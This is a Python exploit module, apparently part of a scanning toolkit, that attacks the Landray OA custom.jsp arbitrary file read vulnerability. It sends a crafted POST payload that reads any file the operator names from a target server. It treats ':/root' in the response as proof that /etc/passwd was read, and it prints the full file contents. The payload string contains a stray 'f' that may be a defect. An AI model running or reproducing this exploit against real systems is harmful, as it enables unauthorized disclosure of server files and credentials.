#! /usr/bin/python3
# -*- encoding: utf-8 -*-
#! /usr/bin/python3
# -*- encoding: utf-8 -*-

import requests
import urllib3
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet

urllib3.disable_warnings()

class LanlingDirReadScan:
    def __init__(self):
        self.proxy = None
        self.header = None
        self.ssl = None

    def run(self,url,data):
        header = {
            'User-Agent': self.header,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip'
        }
        try:
            response = requests.post(url, headers=header, data=data, timeout=5, verify=self.ssl, proxies=self.proxy)
            response.encoding = response.apparent_encoding
            if response.status_code == 200 and ':/root' in response.text:
            # if response.status_code == 200:
                OutPrintInfo("LanLing",f"存在蓝凌OA custom.jsp 任意文件读取漏洞:[b red]{url}[/b red]")
                OutPrintInfo("LanLing","响应体:")
                print(response.text)
            else:
                OutPrintInfo("LanLing", "目标不存在该漏洞")

        except Exception:
            OutPrintInfo("LanLing", "目标不存在该漏洞")
    def main(self, results):
        url = results[0].strip('/ ')
        file = results[1]
        self.ssl = results[2]
        self.header = results[3]
        proxy = results[4]
        reqset = ReqSet(proxy=proxy)
        self.proxy = reqset["proxy"]
        OutPrintInfo("LanLing","开始检测蓝凌OA custom.jsp 任意文件读取漏洞")
        new_url = url + "/sys/ui/extend/varkind/custom.jsp"
        data = 'var={"body":{"file":f"file:///%s"}}' % file

        self.run(new_url,data)
        OutPrintInfo("LanLing","蓝凌OA custom.jsp 任意文件读取漏洞检测结束")